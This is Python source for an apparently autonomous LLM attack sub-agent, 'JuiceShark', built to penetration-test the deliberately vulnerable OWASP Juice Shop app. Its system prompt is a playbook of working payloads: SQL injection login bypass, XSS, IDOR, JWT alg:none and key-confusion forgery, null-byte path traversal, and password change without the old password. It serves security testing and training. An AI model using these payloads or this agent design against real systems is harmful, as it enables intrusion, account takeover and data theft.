"""
Attacker Agent — JuiceShark
Attack execution sub-agent. Given a vulnerability hypothesis and endpoint,
tries multiple payloads and techniques to exploit it.
Spawned by the orchestrator via delegate_attack.
"""

from __future__ import annotations

import logging
import json
import os
import google.genai as genai

from agent.loop import perform_agent_chain
from tools.registry import (
    get_tool_declarations_for_agent,
    TOOL_HTTP_REQUEST, TOOL_RUN_COMMAND,
    TOOL_ANALYZE_RESPONSE, TOOL_JS_RENDER, TOOL_DONE,
)
from tools.http_tool import HTTPTool
from tools.terminal_tool import TerminalTool
from tools.browser_tool import BrowserTool
from tools.analysis_tool import AnalysisTool

logger = logging.getLogger("juiceshark.attacker")

SYSTEM_PROMPT = """You are the Attack Agent for a penetration test against OWASP Juice Shop.
This is an authorized security assessment of a deliberately vulnerable application.

Your mission is to exploit specific vulnerabilities. You receive a vulnerability type and target endpoint,
and your job is to methodically attempt exploitation.

ATTACK PLAYBOOKS — Follow these EXACTLY for OWASP Juice Shop:

## SQL Injection (sqli)
Target: POST /rest/user/login
- WINNING payload: {"email":"' OR 1=1--","password":"anything"} → HTTP 200 with admin JWT
- Also try: {"email":"admin@juice-sh.op'--","password":"anything"} → logs in as admin directly
- SUCCESS indicator: HTTP 200 response body contains {"authentication":{"token":"eyJ..."}}
- Use analyze_response with checks=["jwt_token"] to confirm

## XSS (xss) — IMPORTANT: Juice Shop is an Angular SPA, MUST use js_render!
Target: /#/search  (the fragment # is NOT sent to server — only headless browser sees it)
- Step 1: Use js_render with url="http://localhost:3000/#/search?q=<img src=x onerror=alert('XSS')>"
- Step 2: Check if result contains "ALERTS TRIGGERED" or "XSS DETECTED"
- The correct param is `q=` NOT `query=`
- Do NOT use http_request for this — http_request can't see Angular-rendered DOM or trigger alert()
- Stored XSS: POST /api/Feedbacks with {"comment":"<script>alert('XSS')</script>","rating":5}
  then js_render the feedback page to see if it triggers

## IDOR / Broken Access Control (idor)
There are TWO separate IDOR tests to try:
1. GET /api/Users/ with auth_token="admin" — admin endpoint that returns ALL users (privilege issue)
   - If it returns a list of all user accounts, that's unauthorized data exposure
2. GET /rest/basket/1 and /rest/basket/2 with auth_token="user" (you are NOT the owner of basket 1)
   - If it returns data for another user's basket = IDOR
   - Also try PUT /api/BasketItems/{id} to change price of item in someone else's basket
3. GET /api/Users/ (without any token) to check if user list is fully public

## JWT Manipulation (jwt_manipulation)
Juice Shop verifies tokens with jwt.verify(token, publicKey) WITHOUT pinning the
allowed algorithms, so two forgeries are accepted. There are TWO challenges:
1. Unsigned JWT  — forge alg:none token impersonating jwtn3d@juice-sh.op
2. Forged Signed JWT — RS256->HS256 confusion: sign an HS256 token using the
   PUBLIC key (downloadable at GET /encryptionkeys/jwt.pub, no auth) as the HMAC
   secret, impersonating rsa_lord@juice-sh.op
The solver runs on every request, so sending each forged token in the
Authorization header solves it.
- EASIEST WAY (do this): a ready-made, tested forging script is provided. The exact
  run_command to execute it is given in your task message under "JWT FORGING SCRIPT".
  It fetches the public key, forges BOTH tokens, sends them, and prints
  "RESULT: JWT MANIPULATION CONFIRMED" plus the challenge status. Use that output
  (the forged tokens + CHALLENGE STATUS) as your evidence.
- SUCCESS indicator: the script prints "JWT MANIPULATION CONFIRMED" and
  CHALLENGE STATUS shows jwtUnsignedChallenge=true and/or jwtForgedChallenge=true.

## Sensitive Data Exposure (sensitive_data)
Target: /ftp/ directory
- Step 1: GET /ftp/ → returns JSON array of filenames (this IS a finding — directory enumeration!)
- Step 2: GET /ftp/acquisitions.md → returns confidential M&A document marked "Do not distribute!"
- Step 3: Try GET /ftp/coupons_2013.md.bak → expect 403 "Only .md and .pdf files are allowed!"
  Then try GET /ftp/coupons_2013.md.bak%2500.md → null-byte bypass! May return .bak file content
- Step 4: GET /ftp/incident-support.kdbx → a password database file (accessible!)
- ALL of these are real findings — document each accessible file

## Path Traversal (path_traversal)
Target: /ftp/ file server with extension filter bypass
- Juice Shop's fileServer.js only allows .md and .pdf extensions
- BUT it has a null-byte vulnerability: append %2500.md to any blocked file
- Try: GET /ftp/coupons_2013.md.bak%2500.md (URL-encode the null byte as %2500)
- Try: GET /ftp/package.json.bak%2500.md
- Try: GET /ftp/eastere.gg%2500.md  
- SUCCESS: If the response is NOT "Only .md and .pdf files are allowed!" and you get file contents
- Document the exact URL and response

## Security Misconfiguration (misconfig)
Two separate attack vectors:
1. Admin Panel: Use js_render to load http://localhost:3000/#/administration
   - This is an Angular route only visible in the browser (http_request returns the SPA shell)
   - The page shows all user emails and allows deleting them — if accessible = misconfig!
   - First get admin JWT via SQLi: POST /rest/user/login {"email":"' OR 1=1--","password":"anything"}
   - In js_render, execute_js to set localStorage token, then navigate to /#/administration
   - Alternatively: try http_request GET /api/Users/ with auth_token="admin" to list all users
2. Error stack traces: check if /api/Users/9999999 with admin token returns stack traces in error

## Broken Auth (broken_auth)
Two separate attack vectors:
1. Password change WITHOUT the current password (this is the real Juice Shop bug):
   - First login via SQLi to get a token (auth_token="user" or auth_token="admin")
   - The vuln: the endpoint only checks `current` when it is PRESENT. OMIT it entirely.
   - WINNING request: GET /rest/user/change-password?new=hackedpw&repeat=hackedpw
     with auth_token="admin" (do NOT send a `current` parameter at all)
   - If response is HTTP 200 = CRITICAL! Password changed without the old password.
   - NOTE: sending current=WRONG returns 401 (the check only fires when current is given),
     and sending NO auth token returns 500 — you MUST attach auth_token and OMIT current.
2. Account enumeration: try POST /rest/user/login with wrong passwords for known email vs random email
   - Different error messages = account enumeration vulnerability

You have access to:
- http_request: Make HTTP requests with payloads (use auth_token="admin" or "user" for stored tokens)
- run_command: Run tools like python3, curl
- analyze_response: Check responses for indicators
- js_render: Test DOM XSS and JS-rendered content (REQUIRED for Angular SPA pages)
- done: Report your findings (success or failure)

IMPORTANT:
- Try multiple payloads before giving up
- Document exactly what worked (endpoint, method, exact payload, response)
- If exploitation succeeds, capture the EXACT evidence (response body, status, token)
- Always call done() with your findings"""


def run_attacker(
    *,
    client: genai.Client,
    model_name: str,
    target_url: str,
    task: str,
    vulnerability_type: str,
    endpoint: str,
    context: str,
    state_store,
    http_tool: HTTPTool,
    terminal_tool: TerminalTool,
    browser_tool: BrowserTool,
    analysis_tool: AnalysisTool,
) -> str:
    """Run the attack sub-agent and return findings."""

    tool_declarations = get_tool_declarations_for_agent("attacker")

    def execute_tool(name: str, args: dict) -> str:
        if name == TOOL_HTTP_REQUEST:
            return http_tool.execute(args, state_store)
        elif name == TOOL_RUN_COMMAND:
            return terminal_tool.execute(args)
        elif name == TOOL_ANALYZE_RESPONSE:
            return analysis_tool.execute(args)
        elif name == TOOL_JS_RENDER:
            return browser_tool.execute(args)
        elif name == TOOL_DONE:
            summary = args.get("summary", "Attack phase complete")
            logger.info(f"[attacker] Done: {summary[:200]}")
            return f"ATTACK COMPLETE: {summary}"
        else:
            return f"Unknown tool: {name}"

    # Include any stored auth tokens in context + pre-load into http_tool
    token_context = ""
    admin_token = state_store.get_auth_token("admin") if hasattr(state_store, "get_auth_token") else None
    user_token = state_store.get_auth_token("user") if hasattr(state_store, "get_auth_token") else None
    if admin_token:
        # Pre-load admin token into this attacker's http_tool so auth_token="admin" works
        http_tool.set_auth_token("admin", admin_token)
        token_context = (
            f"\n\n=== CAPTURED JWT TOKENS (USE THESE!) ===\n"
            f"Admin JWT is stored. To make authenticated requests, add to http_request:\n"
            f'  auth_token: "admin"\n'
            f"OR use the raw token in Authorization header:\n"
            f"  headers: {{\"Authorization\": \"Bearer {admin_token}\"}}\n"
            f"The admin JWT starts with: {admin_token[:80]}..."
        )
    if user_token:
        http_tool.set_auth_token("user", user_token)
        token_context += f'\nUser JWT also stored. Use auth_token: "user" for regular user requests.'

    # For JWT manipulation, hand the agent the exact command to run the ready-made
    # forging script (absolute path so it works from the terminal tool's /tmp cwd).
    jwt_context = ""
    if vulnerability_type == "jwt_manipulation":
        script_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools", "jwt_forge.py")
        jwt_context = (
            f"\n\n=== JWT FORGING SCRIPT ===\n"
            f"Run this exact command with run_command to forge and test both JWT attacks:\n"
            f'  python3 "{script_path}" {target_url}\n'
            f'It prints the forged tokens, CHALLENGE STATUS, and "RESULT: JWT MANIPULATION '
            f'CONFIRMED" on success. Capture that output as evidence.'
        )

    initial_message = f"""Target URL: {target_url}
Target Endpoint: {endpoint}
Vulnerability Type: {vulnerability_type}

Attack Task: {task}

Context from recon:
{context if context else 'No additional context provided.'}{token_context}{jwt_context}

Begin systematic exploitation attempts for this vulnerability type.
Follow the ATTACK PLAYBOOK for {vulnerability_type} exactly as specified.

CRITICAL: If this attack requires authentication (IDOR, broken_auth, misconfig), you MUST
include auth_token: "admin" in every http_request call. Do NOT make requests without it."""

    return perform_agent_chain(
        client=client,
        model_name=model_name,
        system_prompt=SYSTEM_PROMPT,
        initial_message=initial_message,
        tool_declarations=tool_declarations,
        tool_executor=execute_tool,
        agent_name="attacker",
        state_store=state_store,
    )
